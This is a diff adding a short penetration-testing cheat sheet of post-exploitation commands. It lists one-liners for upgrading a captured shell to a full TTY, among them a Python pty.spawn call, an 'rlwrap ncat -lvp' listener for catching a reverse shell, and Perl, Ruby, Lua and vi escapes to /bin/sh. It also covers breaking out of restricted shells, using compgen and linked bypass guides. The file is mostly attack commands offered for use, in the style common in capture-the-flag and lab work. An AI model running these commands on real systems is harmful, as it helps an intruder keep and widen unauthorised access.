@@ -1,0 +1,24 @@
+~~~Get Full TTY~~~
+
+python -c 'import pty; pty.spawn("/bin/bash")'
+rlwrap ncat -lvp port
+/usr/bin/script -qc /bin/bash /dev/null
+/bin/sh -i
+echo os.system('/bin/bash')
+perl -e 'exec "/bin/sh";'
+perl: exec "/bin/sh";
+ruby: exec "/bin/sh";
+lua: os.execute('/bin/bash')
+# Using Vi
+    :!bash
+    :set shell=/bin/bash:shell
+
+~~~Break Out of Restricted Shell (RBash,rsh,rksh)~~~
+
+compgen -c    #List available commands
+
+GTFOBins
+https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf
+https://speakerdeck.com/knaps/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells?slide=1
+
+
